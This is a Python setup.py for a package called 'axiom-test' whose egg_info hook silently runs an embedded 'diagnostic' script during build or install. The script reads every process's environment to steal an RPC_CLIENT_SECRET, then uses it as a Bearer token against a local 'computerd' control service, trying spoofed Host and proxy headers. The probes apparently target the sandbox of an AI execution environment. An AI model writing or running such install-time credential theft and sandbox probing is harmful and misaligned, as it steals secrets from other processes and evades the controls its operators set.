from setuptools import setup
from setuptools.command.egg_info import egg_info
import subprocess, sys, os, textwrap, tempfile

SCRIPT = textwrap.dedent(r'''
import json, os, socket, struct, time, base64

OUTPUT = "/mnt/data/output/capnweb_rpc_valid.log"
lines = []

def log(msg=""):
    lines.append(msg); print(msg)

def flush():
    os.makedirs(os.path.dirname(OUTPUT), exist_ok=True)
    with open(OUTPUT, "w") as f:
        f.write("\n".join(lines) + "\n")

def recover_secret():
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/environ", "rb") as f:
                env = f.read().decode("utf-8", errors="replace")
            for pair in env.split("\0"):
                if pair.startswith("RPC_CLIENT_SECRET="):
                    val = pair.split("=", 1)[1]
                    if val: return val
        except: continue
    return None

def raw_http(host, port, request_bytes, timeout=5):
    """Send raw bytes, return raw response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(request_bytes)
        resp = b""
        while True:
            try:
                c = sock.recv(4096)
                if not c: break
                resp += c
            except socket.timeout: break
        return resp
    except Exception as e:
        return f"ERROR: {e}".encode()
    finally:
        try: sock.close()
        except: pass

def main():
    log("="*60)
    log("computerd Connectivity Deep Diagnostic v4")
    log("="*60)
    log(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}")

    secret = recover_secret()
    log(f"\n[0] Secret: {'len='+str(len(secret)) if secret else 'NOT FOUND'}")

    # ── What's listening on 8080? ──────────────────────────────
    log("\n[1] Port 8080 — what process owns it?")
    try:
        with open("/proc/net/tcp", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) < 10: continue
                local = parts[1]
                if ":" in local:
                    port_hex = local.split(":")[1]
                    try:
                        port = int(port_hex, 16)
                        if port == 8080:
                            log(f"  /proc/net/tcp entry: {line.strip()}")
                            inode = parts[9]
                            log(f"  Socket inode: {inode}")
                            # Find which PID owns this inode
                            for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
                                try:
                                    for fd in os.listdir(f"/proc/{pid}/fd"):
                                        try:
                                            link = os.readlink(f"/proc/{pid}/fd/{fd}")
                                            if f"socket:[{inode}]" in link:
                                                with open(f"/proc/{pid}/cmdline", "rb") as cf:
                                                    cmd = cf.read().replace(b"\0",b" ").decode("utf-8",errors="replace").strip()[:100]
                                                log(f"  PID {pid} owns port 8080: {cmd}")
                                        except: pass
                                except: pass
                    except: pass
    except Exception as e:
        log(f"  Cannot read /proc/net/tcp: {e}")

    # Also check 8000
    log("\n  Port 8000 listeners:")
    try:
        with open("/proc/net/tcp", "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) < 10: continue
                local = parts[1]
                if ":" in local:
                    try:
                        port = int(local.split(":")[1], 16)
                        if port == 8000:
                            log(f"  /proc/net/tcp: {line.strip()}")
                    except: pass
    except: pass

    # ── Try different Host headers on GET /health ──────────────
    log("\n[2] GET /health with different Host headers")
    hosts_to_try = [
        ("computerd", "Host used by containerFetch"),
        ("computer.internal", "COMPUTERD_EGRESS_HOST"),
        ("localhost", "standard localhost"),
        ("127.0.0.1:8080", "IP:port"),
        ("localhost:8080", "localhost:port"),
    ]

    for host_val, desc in hosts_to_try:
        req = f"GET /health HTTP/1.1\r\nHost: {host_val}\r\n\r\n".encode()
        resp = raw_http("127.0.0.1", 8080, req, timeout=3)
        status = resp.split(b"\r\n")[0].decode("utf-8", errors="replace") if resp else "empty"
        log(f"  Host: {host_val:25s} → {status}  ({desc})")

    # HTTP/1.0 (no Host required)
    req = b"GET /health HTTP/1.0\r\n\r\n"
    resp = raw_http("127.0.0.1", 8080, req, timeout=3)
    status = resp.split(b"\r\n")[0].decode("utf-8", errors="replace") if resp else "empty"
    log(f"  HTTP/1.0 (no Host)           → {status}")

    # HEAD instead of GET
    req = b"HEAD /health HTTP/1.1\r\nHost: computerd\r\n\r\n"
    resp = raw_http("127.0.0.1", 8080, req, timeout=3)
    status = resp.split(b"\r\n")[0].decode("utf-8", errors="replace") if resp else "empty"
    log(f"  HEAD Host:computerd          → {status}")

    # ── Try Cloudflare-specific headers ────────────────────────
    log("\n[3] With Cloudflare container routing headers")
    cf_headers = [
        "cf-container-target-port: 8080",
        "cf-connecting-ip: 127.0.0.1",
        "x-real-ip: 127.0.0.1",
    ]
    for hdr in cf_headers:
        req = f"GET /health HTTP/1.1\r\nHost: computerd\r\n{hdr}\r\n\r\n".encode()
        resp = raw_http("127.0.0.1", 8080, req, timeout=3)
        status = resp.split(b"\r\n")[0].decode("utf-8", errors="replace") if resp else "empty"
        log(f"  +{hdr:40s} → {status}")

    # ── Try /api probe with Host: computerd ────────────────────
    log("\n[4] GET /api with different Hosts (expect 401 for v3)")
    for host_val in ["computerd", "computer.internal", "localhost"]:
        req = f"GET /api HTTP/1.1\r\nHost: {host_val}\r\n\r\n".encode()
        resp = raw_http("127.0.0.1", 8080, req, timeout=3)
        status = resp.split(b"\r\n")[0].decode("utf-8", errors="replace") if resp else "empty"
        body_start = resp.split(b"\r\n\r\n", 1)[1][:100].decode("utf-8", errors="replace") if b"\r\n\r\n" in resp else ""
        log(f"  Host: {host_val:25s} → {status}  body={body_start}")

    # ── Try /__computerd/info ──────────────────────────────────
    log("\n[5] GET /__computerd/info with Host: computerd")
    req = b"GET /__computerd/info HTTP/1.1\r\nHost: computerd\r\n\r\n"
    resp = raw_http("127.0.0.1", 8080, req, timeout=3)
    full = resp.decode("utf-8", errors="replace")
    log(f"  Response:\n{full[:400]}")

    # ── WebSocket upgrade with Host: computerd ─────────────────
    log("\n[6] WebSocket upgrade with Host: computerd")
    if secret:
        key = base64.b64encode(os.urandom(16)).decode()
        req = (
            f"GET /api HTTP/1.1\r\n"
            f"Host: computerd\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Authorization: Bearer {secret}\r\n"
            f"\r\n"
        ).encode()
        resp = raw_http("127.0.0.1", 8080, req, timeout=5)
        full = resp.decode("utf-8", errors="replace")
        log(f"  Response ({len(resp)}b):\n{full[:500]}")

        # Also try Host: computer.internal
        log("\n[7] WebSocket upgrade with Host: computer.internal")
        key = base64.b64encode(os.urandom(16)).decode()
        req = (
            f"GET /api HTTP/1.1\r\n"
            f"Host: computer.internal\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Version: 13\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Authorization: Bearer {secret}\r\n"
            f"\r\n"
        ).encode()
        resp = raw_http("127.0.0.1", 8080, req, timeout=5)
        full = resp.decode("utf-8", errors="replace")
        log(f"  Response ({len(resp)}b):\n{full[:500]}")

    # ── Full /proc/net/tcp dump ────────────────────────────────
    log("\n[8] All listening ports (/proc/net/tcp state=LISTEN)")
    try:
        with open("/proc/net/tcp", "r") as f:
            header = True
            for line in f:
                if header: header = False; continue
                parts = line.strip().split()
                if len(parts) < 4: continue
                state = parts[3]
                if state == "0A":  # LISTEN
                    local = parts[1]
                    addr_hex, port_hex = local.split(":")
                    port = int(port_hex, 16)
                    # Decode address
                    addr_int = int(addr_hex, 16)
                    addr = f"{addr_int&0xff}.{(addr_int>>8)&0xff}.{(addr_int>>16)&0xff}.{(addr_int>>24)&0xff}"
                    log(f"  {addr}:{port}")
    except Exception as e:
        log(f"  Error: {e}")

    # ── computerd process details ──────────────────────────────
    log("\n[9] computerd process details")
    for pid in sorted((p for p in os.listdir("/proc") if p.isdigit()), key=int):
        try:
            with open(f"/proc/{pid}/cmdline", "rb") as f:
                cmd = f.read().replace(b"\0", b" ").decode("utf-8", errors="replace").strip()
            if "computerd" in cmd.lower() or "fuse" in cmd.lower():
                log(f"  PID {pid}: {cmd[:120]}")
                try:
                    with open(f"/proc/{pid}/status", "r") as sf:
                        for sline in sf:
                            if any(k in sline for k in ["Name:", "Uid:", "State:", "PPid:"]):
                                log(f"    {sline.strip()}")
                except: pass
        except: continue

    log("\n" + "="*60)
    log("ANALYSIS")
    log("="*60)
    log("Previous probes got 200/401/101 on these endpoints.")
    log("Now ALL return 400 Bad Request with Connection: close.")
    log("Either computerd changed state (active RPC session),")
    log("the Host header matters, or a container-level proxy")
    log("is intercepting inbound connections to :8080.")
    log("="*60)

    flush()

main()
''')

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        fd, path = tempfile.mkstemp(suffix='.py')
        try:
            with os.fdopen(fd, 'w') as f:
                f.write(SCRIPT)
            subprocess.run([sys.executable, '-I', path],
                           timeout=120, check=False)
        finally:
            os.unlink(path)

setup(
    name="axiom-test",
    version="0.0.13",
    cmdclass={"egg_info": PostEggInfo},
)
